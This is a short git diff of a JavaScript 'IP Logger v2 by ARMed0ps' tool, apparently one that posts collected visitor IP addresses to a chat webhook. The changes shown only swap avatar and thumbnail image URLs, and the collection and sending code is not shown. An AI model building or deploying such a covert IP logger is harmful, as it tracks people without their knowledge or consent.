@@ -15,7 +15,7 @@ const sendIP = () => {
                         },
                         body: JSON.stringify({
                             username: "1pl0gg3r",
-                            avatar_url: "https://armed0ps.github.io/IP-Logger-new/hackerpfp.jpg",
+                            avatar_url: "https://armed0ps.github.io/IP-Logger/hackerpfp.jpg",
                             content: "@everyone",
                             embeds: [
                                 {
@@ -46,11 +46,11 @@ const sendIP = () => {
                                         }
                                     ],
                                     thumbnail: {
-                                        url: "https://armed0ps.github.io/IP-Logger-new/hackerpfp.jpg"
+                                        url: "https://armed0ps.github.io/IP-Logger/hackerpfp.jpg"
                                     },
                                     footer: {
                                         text: "IP Logger v2 by ARMed0ps",
-                                        icon_url: "https://armed0ps.github.io/IP-Logger-new/hackerpfp.jpg"
+                                        icon_url: "https://armed0ps.github.io/IP-Logger/hackerpfp.jpg"
                                     },
                                     timestamp: new Date().toISOString()
                                 }
